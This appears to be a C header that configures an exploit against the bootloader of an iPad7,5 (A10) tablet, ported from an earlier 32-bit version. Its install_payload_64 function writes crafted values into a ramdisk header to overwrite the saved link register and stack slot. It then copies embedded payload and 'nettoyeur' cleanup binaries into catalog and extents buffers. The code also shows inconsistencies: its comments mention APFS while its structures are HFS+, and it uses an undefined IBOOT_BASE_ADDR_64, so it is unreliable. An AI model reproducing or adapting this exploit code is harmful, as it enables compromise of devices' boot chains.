/*
 * Copyright 2026 ENI & LO. ARM64 Exploit Staging Target Configuration for iPad7,5 (A10).
 * Ported from legacy 32-bit target.h.
 */

#ifndef TARGET64_H
#define TARGET64_H

#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

/* APFS / Disk Image Node Size tuning for ARM64 target */
#define NODE_SIZE_64              0x100

/* The ramdisk header buffer loaded into memory on the device (64-bit base map) */
#define HEADER_BUFFER_64          0x180049D20ULL

/* Safe offset within the header buffer */
#define HEADER_SAFE_OFF_64        0x40

/* Extents root node positioning for 64-bit alignment */
#define EXTENTS_ROOT_NODE_64      ((HEADER_BUFFER_64 + HEADER_SAFE_OFF_64) - IBOOT_BASE_ADDR_64)

#define TOTAL_NODES_64            (0xFFFFF)
#define ROOT_NODE_64              (0xFFFFFF / NODE_SIZE_64 - 1)
#define EXTENT_SIZE_64            ((unsigned long long)NODE_SIZE_64 * (unsigned long long)TOTAL_NODES_64)

#define FLAT_TREE_64              0
#define COPY_ROOT_64              1

/* Ramdisk extents file buffer address in device memory */
#define EXTENTS_BUFFER_64         0x18004A144ULL

/* Target stack pointer reference during arbitrary write execution */
#define FINAL_SP_64               0x18004A290ULL
#define SP_LR_OFFSET_64           0x20 /* 64-bit link register offset */

#define SUITABLE_BIN_SIZE_64      0x91919180ULL

#define SAFE_CATALOG_OFFSET_64    0x30
#define SAFE_EXTENTS_OFFSET_64    0x30

#define CATALOG_BUF_LEN_64        0x200
#define EXTENTS_BUF_LEN_64        0x200

#define NETTOYEUR_CATALOG_LEN_64  (CATALOG_BUF_LEN_64 - SAFE_CATALOG_OFFSET_64)
#define NETTOYEUR_MAX_LEN_64      (NETTOYEUR_CATALOG_LEN_64 + 0x20)
#define PAYLOAD_MAX_LEN_64        (EXTENTS_BUF_LEN_64 - SAFE_EXTENTS_OFFSET_64)

static inline void install_payload_64(uint8_t* buf, uint8_t* header, uint8_t* catalog_file, uint8_t* extents_file) {
    uint8_t nettoyeur[] = {
        #embed "target/nettoyeur64.bin"
    };
    uint8_t payload[] = {
        #embed "target/payload64.bin"
    };

    if (sizeof(payload) > PAYLOAD_MAX_LEN_64) {
        printf("ERROR: ARM64 payload too long, should be no longer than 0x%x (is: 0x%lx)\n", PAYLOAD_MAX_LEN_64, sizeof(payload));
        exit(1);
    }

    printf("Setting up 64-bit LR overwrite (iPad7,5)... ");
    *(uint64_t*)(header + HEADER_SAFE_OFF_64 + 0x8) = SUITABLE_BIN_SIZE_64 >> 5; 
    *(uint64_t*)(header + HEADER_SAFE_OFF_64 + 0x28) = (EXTENTS_BUFFER_64 + SAFE_EXTENTS_OFFSET_64); /* Target LR pointer into payload */
    *(uint64_t*)(header + HEADER_SAFE_OFF_64 + 0x30) = FINAL_SP_64 + SP_LR_OFFSET_64; /* Target stack slot for LR overwrite */
    printf("Done\n");

    printf("Installing ARM64 payload... ");
    memcpy(extents_file + SAFE_EXTENTS_OFFSET_64, payload, sizeof(payload));
    printf("Done\n");

    if (sizeof(nettoyeur) > NETTOYEUR_MAX_LEN_64) {
        printf("ERROR: Nettoyeur64 too long, should be no longer than 0x%x (is: 0x%lx)\n", NETTOYEUR_MAX_LEN_64, sizeof(nettoyeur));
        exit(1);
    }

    printf("Installing Nettoyeur64... ");
    memcpy(catalog_file + SAFE_CATALOG_OFFSET_64, nettoyeur, (sizeof(nettoyeur) > NETTOYEUR_CATALOG_LEN_64) ? NETTOYEUR_CATALOG_LEN_64 : sizeof(nettoyeur));

    if (sizeof(nettoyeur) > NETTOYEUR_CATALOG_LEN_64) {
        memcpy(extents_file, nettoyeur + NETTOYEUR_CATALOG_LEN_64, sizeof(nettoyeur) - NETTOYEUR_CATALOG_LEN_64);
    }
    printf("Done.\n");
}

#endif /* TARGET64_H */
